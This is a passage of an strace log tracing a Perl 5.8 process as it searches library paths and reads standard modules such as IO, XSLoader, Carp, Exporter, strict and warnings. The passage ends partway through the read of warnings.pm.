5779  07:10:39.097628 stat64("/usr/local/share/perl/5.8.4", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097639 stat64("/usr/local/lib/perl/5.8.3", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097651 stat64("/usr/local/share/perl/5.8.3", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097662 stat64("/usr/local/lib/perl/5.8.2", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097674 stat64("/usr/local/share/perl/5.8.2", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097685 stat64("/usr/local/lib/perl/5.8.1", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097696 stat64("/usr/local/share/perl/5.8.1", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097708 stat64("/usr/local/lib/perl/5.8.0", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097719 stat64("/usr/local/share/perl/5.8.0", 0xbfbb7e60) = -1 ENOENT (No such file or directory)
5779  07:10:39.097741 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7b58) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.097840 _llseek(0, 0, [0], SEEK_CUR) = 0
5779  07:10:39.097878 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7b58) = -1 EBADF (Bad file descriptor)
5779  07:10:39.097889 _llseek(1, 0, 0xbfbb7ba0, SEEK_CUR) = -1 EBADF (Bad file descriptor)
5779  07:10:39.097914 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7b58) = -1 EINVAL (Invalid argument)
5779  07:10:39.097925 _llseek(2, 0, 0xbfbb7ba0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5779  07:10:39.097935 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
5779  07:10:39.097948 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7c18) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.097958 _llseek(1, 0, [0], SEEK_CUR) = 0
5779  07:10:39.097969 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
5779  07:10:39.097981 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
5779  07:10:39.097999 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
5779  07:10:39.098051 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
5779  07:10:39.098096 getppid()         = 5777
5779  07:10:39.098154 stat64("/etc/perl/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098168 stat64("/etc/perl/IO.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098181 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098193 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098211 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098223 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098236 stat64("/usr/lib/perl5/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098248 stat64("/usr/lib/perl5/IO.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098261 stat64("/usr/share/perl5/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098272 stat64("/usr/share/perl5/IO.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098285 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098297 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
5779  07:10:39.098318 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.098342 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.098383 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.098424 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
5779  07:10:39.098576 stat64("/etc/perl/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098625 stat64("/etc/perl/XSLoader.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098674 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098709 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098739 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098788 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098867 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098881 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098908 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098937 stat64("/usr/share/perl5/XSLoader.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098950 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.098962 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
5779  07:10:39.098983 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.098997 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.099007 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.099026 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
5779  07:10:39.099262 brk(0x8195000)    = 0x8195000
5779  07:10:39.099632 _llseek(8, 3407, [3407], SEEK_SET) = 0
5779  07:10:39.099650 _llseek(8, 0, [3407], SEEK_CUR) = 0
5779  07:10:39.099660 close(8)          = 0
5779  07:10:39.099705 stat64("/etc/perl/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099720 stat64("/etc/perl/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099733 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099745 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099759 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099772 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099785 stat64("/usr/lib/perl5/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099797 stat64("/usr/lib/perl5/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099809 stat64("/usr/share/perl5/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099837 stat64("/usr/share/perl5/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099874 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099914 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099927 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.099940 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
5779  07:10:39.099960 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.099975 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.099986 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.100003 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
5779  07:10:39.100475 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
5779  07:10:39.100517 read(8, "", 4096) = 0
5779  07:10:39.100529 close(8)          = 0
5779  07:10:39.100551 stat64("/etc/perl/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100565 stat64("/etc/perl/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100578 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100591 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100604 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100617 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100631 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100643 stat64("/usr/lib/perl5/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100656 stat64("/usr/share/perl5/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100667 stat64("/usr/share/perl5/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100681 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100693 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100706 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.100719 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
5779  07:10:39.100740 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.100754 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.100765 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.100782 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
5779  07:10:39.101272 _llseek(8, 2217, [2217], SEEK_SET) = 0
5779  07:10:39.101289 _llseek(8, 0, [2217], SEEK_CUR) = 0
5779  07:10:39.101299 close(8)          = 0
5779  07:10:39.101423 stat64("/etc/perl/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101440 stat64("/etc/perl/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101454 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101466 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101480 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101493 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101506 stat64("/usr/lib/perl5/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101518 stat64("/usr/lib/perl5/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101531 stat64("/usr/share/perl5/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101543 stat64("/usr/share/perl5/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101555 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101568 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101581 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101593 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
5779  07:10:39.101614 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.101628 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.101639 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.101658 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
5779  07:10:39.101795 _llseek(8, 598, [598], SEEK_SET) = 0
5779  07:10:39.101823 _llseek(8, 0, [598], SEEK_CUR) = 0
5779  07:10:39.101864 close(8)          = 0
5779  07:10:39.101938 stat64("/etc/perl/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101953 stat64("/etc/perl/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101966 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101978 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.101992 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102005 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102019 stat64("/usr/lib/perl5/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102030 stat64("/usr/lib/perl5/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102043 stat64("/usr/share/perl5/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102055 stat64("/usr/share/perl5/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102068 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102080 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102093 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.102106 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
5779  07:10:39.102127 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.102141 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.102152 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.102170 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> 